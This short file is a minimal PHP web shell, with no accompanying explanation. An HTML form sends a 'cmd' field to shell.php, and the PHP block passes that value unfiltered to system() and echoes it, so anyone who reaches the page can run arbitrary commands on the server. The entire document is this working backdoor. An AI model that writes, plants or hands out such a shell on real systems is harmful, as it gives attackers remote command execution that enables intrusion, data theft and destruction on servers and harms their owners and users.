<html>
<head></head>
<title></title>
<body>
<form action=shell.php method="GET">
    <input type="text" name="cmd">
    <input type="submit">
</form>
<body>
</html>

<?
    $cmd = $_GET['cmd'];
    echo $cmd."<br>";
    system($cmd);
?>
